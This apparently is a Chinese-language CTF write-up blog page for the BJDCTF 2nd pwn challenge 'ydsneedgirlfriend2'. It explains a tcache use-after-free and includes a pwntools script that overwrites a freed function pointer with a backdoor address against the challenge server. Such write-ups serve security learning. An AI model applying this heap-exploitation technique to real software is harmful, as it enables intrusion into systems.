@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BJDCTF 2nd Pwn Ydsneedgirlfriend2 | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BJDCTF 2nd Pwn Ydsneedgirlfriend2</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/03/24</h2>
+</div>
+
+<main>
+<h1 id="bjdctf-2nd-pwn-ydsneedgirlfriend2">BJDCTF 2nd Pwn Ydsneedgirlfriend2</h1>
+<p>考点：tcache UAF堆利用</p>
+<p>环境：ubuntu18.0.4，libc-2.27</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324215344007.png" alt="image-20200324215344007"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324220241515.png" alt="image-20200324220241515"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324220010996.png" alt="image-20200324220010996"></p>
+<p>增加、删除、查看，存在个atoi()或许可以改got执行system</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324220648552.png" alt="image-20200324220648552"></p>
+<p>在malloc我们给定的length之前会malloc(0x10)把返回的指针存在girlfriends[]数组中，然后malloc我们给出的chunk把返回的指针存在前面的哪个0x10的chunk中，注意这里的v0的类型(viod **v0)，这里把<img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324224151820.png" alt="image-20200324224151820">是把print_girlfriend_name这个函数指针存在了malloc(0x10)的chunk中</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324221703983.png" alt="image-20200324221703983"></p>
+<p>dele函数，这里大概的意思先把指针指向chunk数据的释放，然后在把这个存指针的这个chunk释放，但free的指针未清零，构成UAF的条件</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324224417285.png" alt="image-20200324224417285"></p>
+<p>show函数中箭头实际是执行，在add函数中存在0x10chunk中的print_girlfriend_name函数，回顾c语言知识函数本质也是个指针</p>
+<p>先add3个32字节的chunk看看内存情况</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324222341403.png" alt="image-20200324222341403"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324222519179.png" alt="image-20200324222519179"></p>
+<p>最开始malloc(0x10)的chunk第1个8字节(0x6032e0)存的是指向最后add的chunk的数据部分的指针，第2个8字节(0x4009ab)存的是个指向print_girlfriend_name函数的指针，回顾上面show函数的代码如果我们调用show就相当于调用这个20字节的chunk中第2个8字节指向的函数，那么利用思路就是根据libc2.26之后的tcachebin的分配规则与fastbin类似，我们free的最后一个chunk，在下次malloc时就是把这个chunk重新分配给用户，但是这个free这个chunk的时候里面存的指向函数的指针并不会置空造成野指针(UAF)，我们想办法把这里的指针改为backdoor地址，也就是把图中0x4009ab改为backdoor的地址0x400d86</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324225736625.png" alt="image-20200324225736625"></p>
+<p>我们先add函数创建1个chunk，实际上创建了2个chunk分别是malloc(0x10)和malloc(length)详见add函数代码，再删除第1个chunk也就是序号为0的chunk，看看内存情况</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324235055616.png" alt="image-20200324235055616"></p>
+<p>通过观察我们猜测在堆开始的地址offset 50处存的是tcache结构</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200325000814706.png" alt="image-20200325000814706"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200325000714682.png" alt="image-20200325000714682"></p>
+<p>可以发现dele只删除了8字节的数据，还残留了2个a，因为根据tcache分配规则我们free了0这时候我在add一个16字节的chunk也就会把之前free的序号为0的malloc(0x10)分配给我们，填入8个c然后填入backdoor地址就可以覆盖print_girlfriend_name(0x4009ab)函数的指针为backdoor的指针，然后我们再调用show函数查看我们后add的那个16字节的chunk因为是重新申请的所以序号还是0，就能调用存在0x1ea9260+0x8处的backdoor函数了</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200325001456947.png" alt="image-20200325001456947"></p>
+<p>因为又add了0x10的chunk，所以tcache结构中指向malloc(0x10)的指针不见了，返回给用户了</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200325001755448.png" alt="image-20200325001755448"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324235617524.png" alt="image-20200324235617524"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#75715e">#sh = process(&#39;./ydsneedgirlfriend2&#39;)</span>
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ydsneedgirlfriend2</span><span style="color:#e6db74">&#39;</span>)
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">26579</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(size,name):
+    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">:</span><span style="color:#e6db74">&#39;</span>)
+    sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
+    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">name:</span><span style="color:#e6db74">&#39;</span>)
+    sh<span style="color:#f92672">.</span>sendline(str(size))
+    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">name:</span><span style="color:#e6db74">&#39;</span>)
+    sh<span style="color:#f92672">.</span>sendline(name)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dele</span>(idx):
+    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">:</span><span style="color:#e6db74">&#39;</span>)
+    sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
+    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">:</span><span style="color:#e6db74">&#39;</span>)
+    sh<span style="color:#f92672">.</span>sendline(str(idx))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>(idx):
+    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">:</span><span style="color:#e6db74">&#39;</span>)
+    sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#e6db74">&#39;</span>)
+    sh<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">:</span><span style="color:#e6db74">&#39;</span>)
+    sh<span style="color:#f92672">.</span>sendline(str(idx))
+
+backdoor <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400d86</span>
+add(<span style="color:#ae81ff">30</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">aaaaaaaaaa</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#75715e">#add(30,&#39;bbbbbbbbbb&#39;)</span>
+dele(<span style="color:#ae81ff">0</span>)
+<span style="color:#75715e">#gdb.attach(sh)</span>
+<span style="color:#75715e">#dele(1)</span>
+add(<span style="color:#ae81ff">16</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cccccccc</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span>p64(backdoor))
+<span style="color:#75715e">#gdb.attach(sh)</span>
+show(<span style="color:#ae81ff">0</span>)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200324231554296.png" alt="image-20200324231554296"></p>
+<p>总结：堆题要多动态分析</p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
